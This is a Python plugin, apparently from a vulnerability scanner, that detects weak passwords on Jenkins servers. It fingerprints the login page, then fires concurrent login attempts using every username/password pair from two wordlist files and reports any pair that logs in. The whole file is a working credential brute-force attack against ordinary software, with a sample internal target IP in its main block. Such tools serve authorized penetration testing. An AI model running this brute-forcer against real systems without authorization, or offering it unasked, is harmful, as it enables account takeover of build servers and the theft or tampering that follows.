#!/usr/bin/env python3

import asyncio
from app.lib.common import get_useragent
from app.lib.request import request

class Jenkins_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Jenkins弱口令漏洞',
            'description': 'Jenkins弱口令漏洞',
            'date': '',
            'exptype': 'check',
            'type': 'Weakpwd'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'application/x-www-form-urlencoded'
        }

    async def handle(self, url, data, user, pwd):

        """
        发送请求,判断内容

        :param str url: 请求url
        :param str data: 请求的数据
        :param str user: 用户名
        :param str pwd: 密码

        :return bool True or False: 是否存在漏洞
        """

        try:
            req = await request.post(url, headers = self.headers, data = data)
            if req.status == 302 and 'ACEGI_SECURITY_HASHED' not in req.headers['Set-Cookie']:
                result = "user: %s pwd: %s" %(user, pwd)
                return True, '存在Jenkins弱口令漏洞,弱口令为: ' + result
        except Exception as e:
            # print(e)
            pass

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        finger_req = await request.get(self.url + '/login?from=%2F', headers = self.headers)
        if 'Welcome to Jenkins!' in await finger_req.text():
            url = self.url + "/j_acegi_security_check"
            tasks = []
            for user in open('app/data/username.txt', 'r', encoding = 'utf-8').readlines():
                user = user.strip()
                for pwd in open('app/data/password.txt', 'r', encoding = 'utf-8').readlines():
                    if pwd != '':
                        pwd = pwd.strip()
                    data = {
                        'j_username': user,
                        'j_password': pwd,
                        'from': '',
                        'Submit': 'Sign in'
                    }
                    task = asyncio.create_task(self.handle(url, data, user, pwd))
                    tasks.append(task)
        
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    return True, result[1]

if __name__ == '__main__':
    Jenkins_Weakwd = Jenkins_Weakpwd_BaseVerify('http://10.4.69.55:8789')
    Jenkins_Weakwd.check()